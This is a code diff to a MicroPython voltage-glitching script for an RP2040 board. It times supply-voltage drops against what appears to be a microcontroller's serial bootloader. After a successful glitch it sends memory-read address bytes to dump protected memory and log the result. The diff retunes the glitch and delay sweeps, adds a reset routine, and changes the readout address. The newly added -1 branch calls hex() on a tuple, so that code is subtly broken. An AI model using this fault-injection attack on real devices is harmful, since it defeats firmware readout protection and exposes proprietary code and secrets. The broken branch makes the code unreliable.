@@ -76,6 +76,13 @@ def drop_voltage():
     #wait(0, pin, 0)
     jmp("Prog_Start")
     
+@asm_pio(set_init = rp2.PIO.OUT_LOW, out_shiftdir=PIO.SHIFT_RIGHT, autopull=True, pull_thresh=16)
+def reset():
+    set(pins, 1)
+    nop()		[31]
+    set(pins, 0)
+    nop()		[31]    
+
 # Set Pin 3 output drive strength to be 12mA, slew to be fast. Refer to rp2040 datasheet, PADS_BANK0
 machine.mem32[0x4001c010]=0x7f
 
@@ -127,8 +134,8 @@ def calc_glitch_cycles(duration):
 
 
 while True:
-    for i in range (200, 220, 20): #glitch duration. Accurate to ~20ns
-        for j in range(200, 1500, 20): #delay duration. Accurate to ~20ns
+    for i in range (180, 220, 20): #glitch duration. Accurate to ~20ns
+        for j in range(9500, 12000, 20): #delay duration. Accurate to ~20ns
 
             t_end = time.time() + 2
             #fd.write(f"Glitch duration: {i}, Delay Duration {j} \n")
@@ -172,33 +179,53 @@ while True:
                 
                 # Checks if ACK or NACK is sent. If NACK is received, does not enter if statement and tries to glitch again
                 
+                if (received == -1):
+                    print("Glitched: -1")
+                    sm = StateMachine(0, reset, freq = 2_000, set_base = Pin(3))
+                    sm.active(1)
+                    time.sleep(1)
+                    sm.active(0)
+                    
+                    time.sleep(0.5)
+                    sm = StateMachine(0, drop_voltage, freq = 100_000_000, set_base = Pin(3), in_base = Pin(4))
+                    sm.put(bit_string)
+                    sm.active(1)
+                    
+                    cmd = struct.pack('B', 0x7f)
+                    uart.write(cmd)
+                    received = struct.unpack('b', uart.read())
+                    print(hex(received))
+                    
+                    continue
+
                 if (received != 0x1f):
                     # ACK is received
                     print("Glitched")
                     print(received)
-                    cmd = struct.pack('B', 0x08)
+                    #Vary this from 0x1ffff000 to 0x1fffffff
+                    cmd = struct.pack('B', 0x1f)
+                    uart.write(cmd)
+                    cmd = struct.pack('B', 0xff)
+                    uart.write(cmd)
+                    cmd = struct.pack('B', 0xf4)
                     uart.write(cmd)
                     cmd = struct.pack('B', 0x00)
                     uart.write(cmd)
-                    cmd = struct.pack('B', 0x00)
-                    uart.write(cmd)
-                    cmd = struct.pack('B', 0x00)
-                    uart.write(cmd)
-                    cmd = struct.pack('B', 0x08)
+                    cmd = struct.pack('B', 0x14)
                     uart.write(cmd)
                     
                     received, = struct.unpack('b', uart.read())
                     
-                    cmd = struct.pack('B', 0x0f)
+                    cmd = struct.pack('B', 0xff)
                     uart.write(cmd)
-                    cmd = struct.pack('B', 0xf0)
+                    cmd = struct.pack('B', 0x00)
                     uart.write(cmd)
                     
                     received = uart.read().hex()
                     print(received)
                     fd.write(f"Glitch duration: {i}, Delay Duration {j} \n")
                     fd.write(received)
-                    exit()
+                    quit()
                     
                 print(received)
                 time.sleep(0.01)
